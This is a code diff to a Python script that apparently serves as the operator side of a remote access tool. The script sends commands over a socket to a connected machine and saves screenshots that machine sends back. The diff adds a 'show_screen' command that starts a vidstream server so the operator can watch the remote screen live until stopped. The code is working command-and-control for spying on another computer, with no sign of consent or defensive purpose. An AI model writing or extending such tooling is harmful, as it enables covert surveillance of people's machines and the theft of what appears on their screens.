@@ -1,8 +1,8 @@
 import socket
 import os
 from PIL import Image
+from vidstream import StreamingServer
 import threading
-
 HOST = "172.31.3.253"
 PORT = 8080
 print(socket.gethostname())
@@ -67,6 +67,16 @@ while 1:
         print("executed")
         img_to_save = Image.frombytes("RGB", (490, 490), the_photo)
         img_to_save.save("screenshot.png")
-    
+    elif command == "show_screen":
+        conn.send(command.encode())
+        receiver = StreamingServer(HOST, 3000)
+        t = threading.Thread(target=receiver.start_server)
+        t.start()
+        stop=input("For stop_screen input stop > ")
+        while stop != 'stop':
+            stop = input("For stop_screen input stop > ")
+            continue
+        conn.send(stop.encode())
+        receiver.stop_server()
     else:
         print("not recognized")
